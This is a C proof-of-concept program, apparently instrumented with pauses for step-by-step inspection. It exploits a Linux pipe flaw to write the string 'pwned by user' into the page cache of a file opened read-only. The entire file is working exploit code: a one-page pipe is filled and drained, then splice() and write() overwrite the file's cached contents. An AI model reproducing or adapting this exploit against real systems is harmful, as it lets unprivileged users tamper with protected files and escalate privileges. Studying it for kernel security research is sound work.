#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#define __USE_GNU
#include <fcntl.h>
#include <stdio.h>
#define PAGESIZE    4096
#define F_SETPIPE_SZ    1031

void
pause_for_inspection(char* msg) {
    puts(msg);
    getchar();
}

void
fill_pipe(int pipefd_w) {
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (i == 1) {
            pause_for_inspection("About to perform first write() to pipe");
        }
        if (i == PAGESIZE / 8) {
            pause_for_inspection("About to perform last write() to pipe");
        }
        if (write(pipefd_w, "AAAAAAAA", 8) != 8) {
            exit(1);
        }
    }
}

void
drain_pipe(int pipefd_r) {
    char buf[8];
    for (int i = 1; i <= PAGESIZE / 8; i++) {
        if (i == PAGESIZE / 8) {
            pause_for_inspection("About to perform last read() from pipe");
        }
        if (read(pipefd_r, buf, 8) != 8) {
            exit(1);
        }
    }
}

void
setup_pipe(int pipefd_r, int pipefd_w) {
    if (fcntl(pipefd_w, F_SETPIPE_SZ, PAGESIZE) != PAGESIZE) {
        exit(1);
    }
    fill_pipe(pipefd_w);
    drain_pipe(pipefd_r);
}

void
main() {
    int pipefds[2];
    int tfd;

    pause_for_inspection("About to open() file");
    tfd = open("./target_file", O_RDONLY);
    if (tfd < 0) {
        exit(1);
    }

    pause_for_inspection("About to create pipe()");
    if (pipe(pipefds)) {
        exit(1);
    }

    setup_pipe(pipefds[0], pipefds[1]);

    pause_for_inspection("About to splice() file to pipe");
    if (splice(tfd, 0, pipefds[1], 0, 5, 0) < 0) {
        exit(1);
    }

    pause_for_inspection("About to write() into page cache");
    if (write(pipefds[1], "pwned by user", 13) != 13) {
        exit(1);
    }

    exit(0);
}
